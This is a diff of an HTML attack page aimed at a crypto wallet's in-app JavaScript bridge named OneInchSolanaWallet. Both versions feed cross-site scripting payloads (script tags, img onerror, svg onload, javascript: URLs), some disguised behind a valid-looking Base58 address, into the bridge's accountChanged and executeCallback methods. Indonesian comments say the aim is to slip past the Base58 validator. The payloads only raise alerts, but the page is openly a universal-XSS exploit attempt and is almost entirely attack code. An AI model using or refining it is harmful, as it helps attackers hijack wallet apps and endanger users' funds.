@@ -1,49 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UXSS Scanner V3</title>
-</head>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-
-    <h3>🚀 UXSS TARGETED SCANNER</h3>
-    <button onclick="runUXSS()" style="padding: 15px; background: #222; color: #0f0; border: 1px solid #0f0; width: 100%; cursor: pointer;">
-        START TARGETED ATTACK
-    </button>
-
-    <div id="status" style="margin-top: 20px; font-size: 11px; white-space: pre-wrap; border-top: 1px solid #333;">
-        Ready...
-    </div>
+    <h3>Final UXSS Bypass Attempt</h3>
+    <button onclick="runBypass()" style="padding: 15px; width: 100%; cursor: pointer;">TRY JSON BYPASS</button>
+    <div id="log" style="margin-top: 20px; font-size: 10px; border-top: 1px solid #333;"></div>
 
     <script>
-    function runUXSS() {
+    function runBypass() {
         const target = window.OneInchSolanaWallet;
-        const status = document.getElementById('status');
-        
-        if (!target) return alert("Bridge Not Found");
+        const log = document.getElementById('log');
 
-        // Payload yang dikamuflase (Base58 valid di depan, script di belakang)
-        const smartPayloads = [
-            "11111111111111111111111111111111<script>alert(1)<\/script>", 
-            "2xT8p8...';alert(document.domain);//",
-            "javascript:alert('UXSS')",
-            "<img src=x onerror=alert(8)>",
-            "{\"address\":\"1111...\", \"meta\":\"<svg/onload=alert(1)>\"}"
+        // Mencoba mengirim objek alih-alih string untuk membingungkan validator Base58
+        const complexPayloads = [
+            { address: "11111111111111111111111111111111", script: "<img src=x onerror=alert(1)>" },
+            { type: "test", data: "javascript:alert(document.domain)" }
         ];
 
-        status.innerHTML = "Attacking accountChanged & executeCallback...\n";
-
-        smartPayloads.forEach(p => {
+        complexPayloads.forEach(p => {
             try {
-                // Mencoba bypass proteksi base58
-                target.accountChanged(p);
-                
-                // Mencoba menyuntikkan callback (Ini jalur UXSS paling umum)
-                target.executeCallback("payload", p, true);
-                
-                status.innerHTML += `> Sent: ${p.substring(0,20)}...\n`;
+                // Memanggil dengan objek JSON
+                target.executeCallback("any_id", JSON.stringify(p), true);
+                log.innerHTML += `> Sent JSON payload to executeCallback\n`;
             } catch(e) {
-                status.innerHTML += `> Log: ${e.message}\n`;
+                log.innerHTML += `> Failed: ${e.message}\n`;
             }
         });
     }
